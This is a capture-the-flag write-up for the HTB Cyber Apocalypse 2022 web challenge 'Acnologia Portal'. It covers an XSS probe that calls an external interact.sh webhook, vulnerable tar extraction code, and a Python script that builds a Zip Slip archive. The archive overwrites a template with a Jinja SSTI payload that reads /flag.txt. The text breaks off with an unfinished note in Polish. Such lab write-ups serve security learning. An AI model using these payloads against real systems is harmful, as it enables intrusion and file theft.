# Acnologia Portal
Acnologia Portal is another medium web challenge solved by our team during HTB Cyber Apocalypse 2022. It starts with the login page, where in addition we can create our own new account. 

![login.png](login.png)

After successful login, we are redirected to the `/dashboard` page, where is a list of firmwere. 

![list.png](list.png)

Main function of the application is to report a bug to the particular firmware, then the bug will be reviewed by the `administrator`. So our first thought was to try XSS.

## XSS

We checked for XSS by trying to send a request to the webhook and it worked!
```
<img src="http://c9zv8s32vtc0000byq1ggfbg1fwyyyyyn.interact.sh">
```

## Source Code

The flag is hidden in the file `flag.txt` so there is no way by using only XSS to end the challnege. Source code was given, so let's see what other functions we have.

The admin's behaviour is described in `bot.py` file, its his purpose is only review our bug report. More intrestnig part is in `routes.py`, there are 2 functions where admin's privileges are needed - `review_report()` and `firmware_update()`. The second one caught your attention, the functionality is described in detail in `util.py`.

```
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```
It seems an administrator can upload a tar file to be unpacked to the server, which is an perfect scenario for the `Zip Slip` vulnerability.

## Zip Slip

So the idea is that XSS does the tar file upload and perform the Zip Slip attack. I have checked after some code modifiaction if Zip Slip works locally (commented the `@is_admin()` lines) and I was able to replace original files.

Best files to replace in our opinion are the templates, so we have picked `register.html`, and after of tar file upload, `/register` page is going to read the flag.

```
import tarfile    
import io            
import requests
import time
    
fname = "../../../../../../../../../app/application/templates/register.html"                    
data = b"""                                                                           
{{ get_flashed_messages.__globals__.__builtins__.open("/flag.txt").read() }}
"""                                       
source = io.BytesIO(initial_bytes=data)                                                  

fh = io.BytesIO()                           
with tarfile.open(fileobj=fh, mode='w:gz') as tar:
    info = tarfile.TarInfo(fname)   
    info.size = len(data)
    info.mtime = time.time()            
    tar.addfile(info, source)                                                                                   

with open('test.tar.gz', 'wb') as f:
    f.write(fh.getvalue())
    
f.close()
```

`a teraz jak przygotować XSS-a, który zauploaduje nam tar-a i jednocześnie nie spadnie z rowerka`
